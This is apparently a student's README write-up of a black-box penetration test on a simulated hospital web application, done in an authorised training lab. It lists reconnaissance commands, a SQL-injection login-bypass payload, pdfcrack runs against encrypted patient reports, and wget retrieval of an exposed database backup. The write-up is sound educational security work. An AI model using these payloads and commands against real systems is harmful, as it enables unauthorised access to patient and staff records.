# black-box_penetration_test
A full black-box penetration test conducted against a simulated hospital web application. This project documents the complete methodology, tools, findings, and exploitation steps across four milestones, from initial reconnaissance to a professional pentest report.

> This project was conducted in a controlled environment for educational purposes only. The target was authorised for security testing by NetworkWalks Academy. Never apply these techniques to any system without explicit written permission from the owner.

---

## Project Overview

| Field | Detail |
|---|---|
| Target | https://medirozahospital.com |
| Assessment Type | Black-Box Penetration Test |
| Duration | 5 Days |
| Tester | Blessing Princess Augustine |
| Tools | Kali Linux, curl, Nikto, pdfcrack, wget |

---

## Milestones

| Milestone | Objective | Status |
|---|---|---|
| M1 | Gain unauthorised access and retrieve 3 confidential patient PDF lab reports | Completed |
| M2 | Crack the encryption on all 3 retrieved PDF files | Completed |
| M3 | Find staff salaries and shareholder details on the server | Completed |
| M4 | Write a professional penetration testing report | Completed |

---

## Tools Used

- **curl** — HTTP header analysis and source code fingerprinting
- **Nikto v2.6.0** — Automated web vulnerability scanner
- **pdfcrack** — PDF password cracking
- **pdf2john** — PDF hash extraction (for John the Ripper)
- **wget** — File retrieval from exposed directories
- **rockyou.txt** — Password wordlist (standard Kali Linux)
- **Firefox** — Manual browser-based testing and verification

---

## Methodology

### Phase 1 — Reconnaissance

**1. Fingerprint the target with curl**

```bash
curl -i https://medirozahospital.com
```
What to look for in the output:

	•	Server: header — identifies web server software
	•	x-powered-by: — reveals backend language/version
	•	HTML source — check for hidden links, login pages, CMS generator tags

**2. Run Nikto to identify misconfigurations**

```bash
   nikto -h https://medirozahospital.com
```
Key findings to watch for: directory indexing, missing security headers, exposed admin panels, outdated software.

**3. Check robots.txt**

```bash
curl https://medirozahospital.com/robots.txt
```
Disallow entries often reveal sensitive paths the admin didn't want indexed — but made public anyway.

**4. Enumerate directories**

```bash
curl https://medirozahospital.com/patient/
curl https://medirozahospital.com/staff/
curl https://medirozahospital.com/old/
```
If directory indexing is enabled, the server returns a browsable file listing with no authentication required.

---

### Phase 2 — Finding the Entry Point

**5. Inspect login page source**

```bash
curl -i https://medirozahospital.com/patient/login.php
curl -i https://medirozahospital.com/staff/login.php
```
Look for: form field names, action URL, missing CSRF token, session cookie behaviour.

---

### Phase 3 — Exploitation (M1:SQL Injection)

The patient portal login was vulnerable to SQL injection. The application passed user input directly into SQL queries without sanitisation.

Payload used:

Username: admin' --
 Password: admin' --

The -- comments out the rest of the SQL query, bypassing the password check entirely.

Enter the payload directly in the browser login form at:
https://medirozahospital.com/patient/login.php

If successful, you will be redirected to the patient dashboard showing downloadable lab reports.

---

### Phase 4 — PDF Password Cracking (M2)

After downloading the 3 encrypted PDFs from the portal, crack the passwords using pdfcrack:

```bash
pdfcrack -f patient_report_1.pdf -w /usr/share/wordlists/rockyou.txt
pdfcrack -f patient_report_2.pdf -w /usr/share/wordlists/rockyou.txt
pdfcrack -f patient_report_3.pdf -w /usr/share/wordlists/rockyou.txt
```

If rockyou.txt is still compressed on your Kali install, unzip it first:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```
Passwords found:

	•	patient_report_1.pdf: 123456
	•	patient_report_2.pdf: password
	•	patient_report_3.pdf: !@#$%^&

---

### Phase 5 — Database Backup Exposure (M3)

The /old/ directory was flagged by Nikto as having directory indexing enabled. Browsing it directly revealed a full MySQL database backup.

```bash
curl https://medirozahospital.com/old/
wget https://medirozahospital.com/old/mediroza_db_backup_2019.sql
```
Search the downloaded file for sensitive tables:

```bash
grep -i "CREATE TABLE" mediroza_db_backup_2019.sql
grep -i "salary" mediroza_db_backup_2019.sql
grep -i "shareholder" mediroza_db_backup_2019.sql
```
The backup contained:

	•	Full salary records for 30 hospital staff including national IDs
	•	Complete shareholder register (10 shareholders, share percentages and classes)

 ---
 
## Key Findings Summary

| ID | Finding	| Severity |
|---|---|---|
| F1	| SQL Injection — Patient Portal Login | Critical |
| F2	| Unauthenticated Database Backup Exposure	| Critical |
| F3	| Directory Indexing on /patient/, /staff/, /old/	| High |
| F4	| Weak PDF Encryption Passwords	| High |
| F5	| Exposed Server Control Panel	| High |
| F6	| IlohaMail 0.8.10 XSS Vulnerability	| Medium |
| F7	| 5 Missing Security Headers	| Medium |
| F8	| robots.txt Information Disclosure	| Low |

---

## Deliverables

	•	Mediroza_Pentest_Report.pdf — Full penetration testing report
	•	Evidence_Report.pdf —  evidence and data summary

---

## Disclaimer

This project was conducted in a controlled lab environment provided by NetworkWalks Academy as part of Batch B083 Week 4 training. Written authorisation was granted by the client. These techniques must never be applied to any real system without explicit written permission from the owner.

---

## Author
**Blessing Princess Augustine** | **Cybersecurity Intern**

**Networkwalks Academy**
